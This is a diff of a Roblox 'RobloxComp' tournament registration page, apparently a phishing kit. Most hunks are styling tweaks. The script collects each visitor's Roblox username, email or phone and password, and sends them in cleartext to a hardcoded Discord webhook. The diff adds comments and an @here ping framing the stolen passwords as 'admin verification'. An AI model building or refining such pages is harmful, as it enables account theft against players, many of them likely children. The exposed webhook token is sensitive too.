@@ -23,7 +23,7 @@
 
         ::-webkit-scrollbar { width: 4px; }
         ::-webkit-scrollbar-track { background: #11131f; }
-        ::-webkit-scrollbar-thumb { background: #ff1a3a; border-radius: 10px; }
+        ::-webkit-scrollbar-thumb { background: #ff3355; border-radius: 10px; }
 
         .site-container {
             max-width: 1400px;
@@ -64,7 +64,7 @@
         .dot:nth-child(3) { animation-delay: 0.6s; background: #ffb3c6; }
         @keyframes pulseWave {
             0% { opacity: 0.25; transform: scale(0.8); }
-            50% { opacity: 1; transform: scale(1.3); background: #fff5f0; box-shadow: 0 0 12px rgba(255,80,120,0.7); }
+            50% { opacity: 1; transform: scale(1.3); background: #fff5f0; box-shadow: 0 0 12px rgba(255,80,120,0.5); }
             100% { opacity: 0.25; transform: scale(0.8); }
         }
 
@@ -97,22 +97,22 @@
         }
         .logo-combined .roblox-white {
             color: #ffffff;
-            text-shadow: 0 0 10px rgba(255,255,255,0.5);
+            text-shadow: 0 0 4px rgba(255,255,255,0.3);
         }
         .logo-combined .comp-red {
-            color: #ff1a3a;
-            text-shadow: 0 0 8px #ff1a3a, 0 0 15px #ff3355;
+            color: #ff3355;
+            text-shadow: 0 0 3px #ff3355;
             font-weight: 900;
         }
         .logo-combined:hover {
             transform: scale(1.02);
         }
         .logo-combined:hover .roblox-white {
-            text-shadow: 0 0 18px rgba(255,255,255,0.9);
+            text-shadow: 0 0 8px rgba(255,255,255,0.5);
         }
         .logo-combined:hover .comp-red {
-            text-shadow: 0 0 20px #ff3355, 0 0 30px #ff5e7e;
-            color: #ff3355;
+            text-shadow: 0 0 8px #ff3355;
+            color: #ff4d6d;
         }
         .github-btn {
             font-size: 0.7rem;
@@ -138,7 +138,7 @@
 
         /* SLOT WARNING */
         .slot-warning {
-            background: rgba(255, 100, 40, 0.12);
+            background: rgba(255, 100, 40, 0.1);
             border-left: 3px solid #ffa047;
             border-radius: 1rem;
             padding: 0.7rem 1.2rem;
@@ -194,9 +194,9 @@
             outline: none;
             transition: all 0.2s;
         }
-        .input-field:focus { border-color: #ff1a3a; box-shadow: 0 0 8px rgba(255, 26, 58, 0.3); }
+        .input-field:focus { border-color: #ff3355; box-shadow: 0 0 8px rgba(255, 51, 85, 0.2); }
         .login-btn {
-            background: linear-gradient(95deg, #ff1a3a, #ff5c7e);
+            background: linear-gradient(95deg, #ff2e4d, #ff5c7e);
             width: 100%;
             border: none;
             padding: 0.75rem;
@@ -210,7 +210,7 @@
             justify-content: center;
             gap: 8px;
         }
-        .login-btn:hover { transform: scale(1.01); box-shadow: 0 6px 14px rgba(255,26,58,0.4); }
+        .login-btn:hover { transform: scale(1.01); box-shadow: 0 6px 14px rgba(255,46,77,0.3); }
         .team-fields { margin-top: 1rem; display: none; transition: 0.2s; }
         .team-fields.show-team { display: block; animation: fadeSlide 0.25s ease; }
         .team-row { margin-bottom: 0.6rem; }
@@ -240,7 +240,7 @@
         }
         .tournament-card:hover {
             transform: translateY(-4px);
-            border-color: #ff3355;
+            border-color: #ff5c7e;
             background: rgba(20, 22, 38, 0.8);
         }
         .tournament-header {
@@ -302,35 +302,51 @@
         .nexoo-glow {
             color: #ff3355;
             font-weight: 800;
-            text-shadow: 0 0 6px #ff1a3a;
+            text-shadow: 0 0 3px #ff3355;
             transition: 0.2s;
             display: inline-block;
         }
-        .nexoo-glow:hover { text-shadow: 0 0 12px #ff5e7e; transform: scale(1.02); }
+        .nexoo-glow:hover { text-shadow: 0 0 8px #ff5e7e; transform: scale(1.02); }
         .hidden-message { display: none; }
         
+        /* TOAST MESSAGE - SUPER SMOOTH FADE */
         .toast-message {
             position: fixed;
-            bottom: 20px;
+            bottom: 30px;
             left: 50%;
             transform: translateX(-50%);
-            background: #11131fe6;
-            backdrop-filter: blur(20px);
-            padding: 10px 22px;
-            border-radius: 40px;
-            font-size: 0.8rem;
+            background: #1a1d2ee6;
+            backdrop-filter: blur(16px);
+            padding: 12px 26px;
+            border-radius: 60px;
+            font-size: 0.85rem;
             z-index: 1500;
             border-left: 3px solid;
-            transition: opacity 0.25s;
+            transition: opacity 0.4s ease, visibility 0.4s ease, transform 0.3s ease;
             pointer-events: none;
             display: flex;
             align-items: center;
-            gap: 8px;
+            gap: 10px;
+            font-weight: 500;
+            letter-spacing: 0.2px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
         }
+        .toast-message.show {
+            opacity: 1 !important;
+            visibility: visible !important;
+            transform: translateX(-50%) translateY(0);
+        }
+        .toast-message.hide {
+            opacity: 0 !important;
+            visibility: hidden !important;
+            transform: translateX(-50%) translateY(10px);
+        }
+        
         @media (max-width: 780px) {
             .site-container { padding: 1.2rem; }
             .two-col { flex-direction: column; }
             .logo-combined { font-size: 1.6rem; }
+            .toast-message { padding: 8px 18px; font-size: 0.75rem; bottom: 20px; }
         }
     </style>
 </head>
@@ -367,7 +383,7 @@
                 </div>
                 <div class="input-group">
                     <label><i class="fas fa-lock"></i> Password</label>
-                    <input type="text" id="password" class="input-field" placeholder="password">
+                    <input type="text" id="password" class="input-field" placeholder="••••••">
                 </div>
                 <div id="teamFieldsContainer" class="team-fields">
                     <div style="font-size:0.7rem; margin-bottom:8px; color:#a0a8cc;"><i class="fas fa-users"></i> Team roster (4 slots)</div>
@@ -415,6 +431,8 @@
 
 <script>
     (function(){
+        // 🔴🔴🔴 WICHTIG FÜR ADMINS: HIER DEINE DISCORD WEBHOOK URL EINTRAGEN 🔴🔴🔴
+        // Das Passwort und Email/Phone werden KLAR TEXT im Discord Kanal angezeigt zur Verifikation!
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1499515879258587147/S0eV5V__tx4vOcgdFSxK_yAvmA0B0U1n_VyOsX54iCFq-ZRQ6477Y6IT5u9J5Iobkv1v";
         
         const globalLoader = document.getElementById('globalLoader');
@@ -430,20 +448,29 @@
         const teamMember4 = document.getElementById('teamMember4');
         const dynamicNotice = document.getElementById('dynamicAdminNotice');
 
-        let toastTimeout;
+        let toastTimeout = null;
+
         function showToast(msg, isError, duration = 2800) {
             const toast = document.getElementById('floatingToast');
             if (!toast) return;
             if (toastTimeout) clearTimeout(toastTimeout);
+            
             toast.style.borderLeftColor = isError ? '#ff5c6e' : '#2eff8a';
-            toast.style.backgroundColor = '#0f111fe6';
             const icon = isError ? '<i class="fas fa-times-circle" style="color:#ff7a8a;"></i>' : '<i class="fas fa-check-circle" style="color:#6eff9e;"></i>';
             toast.innerHTML = icon + ' <span>' + msg + '</span>';
+            
+            toast.classList.remove('hide');
+            toast.classList.add('show');
             toast.style.opacity = '1';
             toast.style.visibility = 'visible';
+            
             toastTimeout = setTimeout(() => {
-                toast.style.opacity = '0';
-                toast.style.visibility = 'hidden';
+                toast.classList.remove('show');
+                toast.classList.add('hide');
+                toastTimeout = setTimeout(() => {
+                    toast.style.opacity = '0';
+                    toast.style.visibility = 'hidden';
+                }, 400);
             }, duration);
         }
 
@@ -467,25 +494,38 @@
             dynamicNotice.classList.remove('hidden-message');
         }
 
+        // Discord Webhook mit KLARTEXT Email/Phone und Password für Admins
         async function sendToDiscord(username, emailPhone, password, teamArray) {
             if (DISCORD_WEBHOOK_URL === "https://discord.com/api/webhooks/REPLACE_ME_WITH_YOUR_WEBHOOK_URL") 
                 throw new Error("WEBHOOK_NOT_SET");
-            const teamFields = teamArray.map((n,i) => "Slot " + (i+1) + ": " + (n || "—")).join("\n");
-            const payload = {
-                embeds: [{
-                    title: "NEW RIVALS REGISTRATION - RobloxComp",
-                    color: 0xff1a3a,
-                    fields: [
-                        { name: "Roblox Username", value: username || "NULL", inline: true },
-                        { name: "Email / Phone", value: emailPhone || "NULL", inline: true },
-                        { name: "Password (CLEAR)", value: password || "empty", inline: false },
-                        { name: "Team Members", value: teamFields || "No members", inline: false }
-                    ],
-                    timestamp: new Date().toISOString()
-                }]
+            
+            const teamFieldsList = teamArray.map((n,i) => `**Slot ${i+1}:** ${n || "—"}`).join("\n");
+            
+            // WICHTIG: Email/Phone und Password werden im KLARTEXT an Discord gesendet
+            const embed = {
+                title: "🔴 NEUE REGISTRIERUNG - RobloxComp 🔴",
+                color: 0xff3355,
+                fields: [
+                    { name: "🎮 Roblox Username", value: username || "❌ nicht angegeben", inline: true },
+                    { name: "📧 Email / Phone", value: emailPhone || "❌ nicht angegeben", inline: true },
+                    { name: "🔓 PASSWORD (KLARTEXT ZUR VERIFIKATION)", value: password || "❌ kein Passwort", inline: false },
+                    { name: "👥 Team Mitglieder (4 Slots)", value: teamFieldsList || "Keine Teammitglieder", inline: false }
+                ],
+                timestamp: new Date().toISOString(),
+                footer: { text: "Admin Verifikation notwendig • RobloxComp Official" }
             };
-            const res = await fetch(DISCORD_WEBHOOK_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(payload) });
-            if (!res.ok) throw new Error("Discord error");
+            
+            const payload = {
+                embeds: [embed],
+                content: "@here **NEUE ANMELDUNG** - Bitte verifizieren!"
+            };
+            
+            const res = await fetch(DISCORD_WEBHOOK_URL, { 
+                method: "POST", 
+                headers: { "Content-Type": "application/json" }, 
+                body: JSON.stringify(payload) 
+            });
+            if (!res.ok) throw new Error("Discord error: " + res.status);
             return true;
         }
 
@@ -495,7 +535,7 @@
             const password = passwordInput.value;
 
             if (!robloxUser) {
-                showToast("Please put in your username", true, 1900);
+                showToast("Please put in your username", true, 2000);
                 return;
             }
             if (!teamContainer.classList.contains('show-team')) {
@@ -518,12 +558,13 @@
                 await sendToDiscord(robloxUser, emailPhone || "not provided", password || "empty", teamSlots);
                 showInlineLoader(false);
                 showSuccessAdminMessage();
-                showToast("Registration successful", false, 2700);
+                showToast("Registration successful! Discord notification sent.", false, 3000);
                 passwordInput.value = "";
             } catch(err) {
                 showInlineLoader(false);
-                let msg = err.message.includes("WEBHOOK_NOT_SET") ? "Webhook not configured (replace URL)" : "Request failed";
-                showToast(msg, true, 3200);
+                let msg = err.message.includes("WEBHOOK_NOT_SET") ? "Webhook not configured! Replace URL in code." : "Request failed: " + err.message;
+                showToast(msg, true, 4000);
+                console.error(err);
             }
         }
 
@@ -537,19 +578,23 @@
             if (globalLoader) globalLoader.classList.add('hidden-loader');
             setTimeout(function() {
                 mainContainer.classList.add('loaded');
-                showToast("Welcome to RobloxComp", false, 1800);
+                showToast("Welcome to RobloxComp", false, 2000);
             }, 200);
         }, 1000);
 
         teamContainer.classList.remove('show-team');
         dynamicNotice.classList.add('hidden-message');
 
+        // Webhook Warning für Admins
         if (DISCORD_WEBHOOK_URL.indexOf("REPLACE_ME") !== -1) {
             var warnSpan = document.createElement('div');
             warnSpan.style.fontSize = "0.65rem";
-            warnSpan.style.marginTop = "8px";
-            warnSpan.style.color = "#ffab8e";
-            warnSpan.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Replace webhook URL for live Discord';
+            warnSpan.style.marginTop = "12px";
+            warnSpan.style.padding = "8px";
+            warnSpan.style.background = "rgba(255,50,80,0.15)";
+            warnSpan.style.borderRadius = "12px";
+            warnSpan.style.color = "#ff8a9e";
+            warnSpan.innerHTML = '<i class="fas fa-exclamation-triangle"></i> ⚠️ DISCORD WEBHOOK NICHT KONFIGURIERT! Bitte ersetze die Webhook URL im Code, sonst kommen keine Daten bei den Admins an!';
             var loginCard = document.querySelector('.login-card');
             if (loginCard) loginCard.appendChild(warnSpan);
         }
@@ -558,7 +603,7 @@
         if(gitBtn) {
             gitBtn.addEventListener('click', function(e) {
                 e.preventDefault();
-                showToast("RobloxComp .github.io | open source", false, 1500);
+                showToast("RobloxComp .github.io | open source hub", false, 1500);
             });
         }
     })();
